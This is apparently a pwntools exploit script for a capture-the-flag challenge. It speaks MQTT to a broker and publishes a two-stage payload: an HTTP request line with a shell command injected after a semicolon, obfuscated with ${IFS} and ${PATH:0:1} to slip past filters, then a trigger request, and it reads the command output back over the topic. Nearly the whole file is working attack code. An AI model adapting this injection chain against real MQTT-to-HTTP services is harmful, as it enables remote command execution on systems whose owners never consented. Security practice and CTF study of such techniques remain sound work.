#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

exe = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
context.binary = exe

host = args.HOST or 'nc1.ctfplus.cn'
port = int(args.PORT or 16121)
local_host = args.LOCAL_HOST or '127.0.0.1'
local_port = int(args.LOCAL_PORT or 9999)
topic = (args.TOPIC or 'HTTP').encode()
cmd = (args.CMD or 'cat${IFS}${PATH:0:1}flag').encode()
observe = float(args.OBSERVE or 3)
wait_heart = float(args.WAIT_HEART or 0)
window = float(args.WINDOW or 8)
client_id = (args.CLIENT or ('exp_' + randoms(6))).encode()
gs = 'b *main\nc'

io = None
proc = None


def start():
    global proc

    if args.LOCAL:
        if proc is None:
            proc = process(
                [ld.path, '--library-path', '.', exe.path],
                env={'LD_PRELOAD': libc.path},
            )
            sleep(0.3)
        return remote(local_host, local_port)

    return remote(host, port)


def tick_count(seconds, step=0.2):
    total = int(seconds / step)
    if seconds > total * step:
        total += 1
    return total


def mqtt_len(value):
    data = b''
    while 1:
        cur = value & 0x7f
        value >>= 7
        if value:
            cur |= 0x80
        data += p8(cur)
        if not value:
            return data


def mqtt_str(data):
    if isinstance(data, str):
        data = data.encode()
    return p16(len(data), endian='big') + data


def xrecv(size, timeout=1):
    if not size:
        return b''
    data = io.recvn(size, timeout=timeout)
    if len(data) != size:
        raise EOFError('short read')
    return data


def recv_packet(timeout=0.2):
    if not io.can_recv(timeout):
        raise EOFError('timeout')

    header = xrecv(1)[0]
    remain = 0
    shift = 0

    while 1:
        cur = xrecv(1)[0]
        remain |= (cur & 0x7f) << shift
        if not (cur & 0x80):
            break
        shift += 7

    return header, xrecv(remain)


def parse_publish(header, body):
    pos = 0
    topic_len = u16(body[pos:pos + 2], endian='big')
    pos += 2
    topic = body[pos:pos + topic_len]
    pos += topic_len
    packet_id = None

    if (header >> 1) & 3:
        packet_id = u16(body[pos:pos + 2], endian='big')
        pos += 2

    return topic, packet_id, body[pos:]


def http_message(payload):
    if not payload.startswith(b'{"clientid":"httpclient"'):
        return None
    if b'"message":' not in payload:
        return None
    tail = payload.split(b'"message":', 1)[1].lstrip()
    if not tail.startswith(b'"'):
        return None
    return tail[1:].split(b'"', 1)[0]


def mqtt_connect():
    global io
    now_host = local_host if args.LOCAL else host
    now_port = local_port if args.LOCAL else port

    for name, level, label in (
        (b'MQTT', 4, 'MQTT 3.1.1'),
        (b'MQIsdp', 3, 'MQTT 3.1'),
    ):
        io = start()
        body = mqtt_str(name) + p8(level) + b'\x02' + p16(0x3c, endian='big') + mqtt_str(client_id)
        io.send(b'\x10' + mqtt_len(len(body)) + body)

        try:
            header, resp = recv_packet(1)
        except EOFError:
            io.close()
            continue

        if header == 0x20 and resp == b'\x00\x00':
            log.success('connected to %s:%d via %s' % (now_host, now_port, label))
            return

        io.close()

    raise SystemExit('connect failed')


def subscribe(topic, packet_id=1):
    body = p16(packet_id, endian='big') + mqtt_str(topic) + b'\x00'
    io.send(b'\x82' + mqtt_len(len(body)) + body)
    header, resp = recv_packet(1)
    if header != 0x90:
        raise SystemExit('bad suback: %#x %r' % (header, resp))


def publish(topic, data):
    if isinstance(data, str):
        data = data.encode()
    body = mqtt_str(topic) + data
    io.send(b'\x30' + mqtt_len(len(body)) + body)


def poison(cmd):
    return b'GET /home/ctf/index_html;' + cmd + b' HTTP/1.1\r\nHost: x\r\n'


def trigger():
    return b'GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n'


def drain(seconds, stop_on_heartbeat=False, ignore=()):
    seen_heartbeat = False

    for _ in range(tick_count(seconds)):
        try:
            header, body = recv_packet(0.2)
        except EOFError:
            continue

        if header >> 4 != 3:
            continue

        cur_topic, _, payload = parse_publish(header, body)
        if cur_topic != topic or payload in ignore:
            continue

        msg = http_message(payload)
        if msg is None:
            try:
                log.info(payload.decode())
            except Exception:
                log.info(repr(payload))
            continue

        if msg == b'200':
            seen_heartbeat = True
            log.info('heartbeat => %s' % msg.decode())
            if stop_on_heartbeat:
                break
            continue

        try:
            log.success('httpclient => %s' % msg.decode())
        except Exception:
            log.success('httpclient => %r' % msg)

    return seen_heartbeat


def exp():
    stage1 = poison(cmd)
    stage2 = trigger()

    mqtt_connect()
    subscribe(topic)
    log.info('topic => %s' % topic.decode())
    log.info('cmd   => %s' % cmd.decode())

    seen_heartbeat = False
    if wait_heart > 0:
        seen_heartbeat = drain(wait_heart, stop_on_heartbeat=True)
    else:
        seen_heartbeat = drain(observe)

    if not seen_heartbeat:
        log.warning('no httpclient heartbeat observed')

    # gdb.attach(io, 'b *main\nc')
    # gdb.attach(proc, gs)
    publish(topic, stage1)
    log.info('stage1 sent')
    sleep(0.4)
    publish(topic, stage2)
    log.info('stage2 sent')

    drain(window, ignore=(stage1, stage2))


if __name__ == '__main__':
    exp()
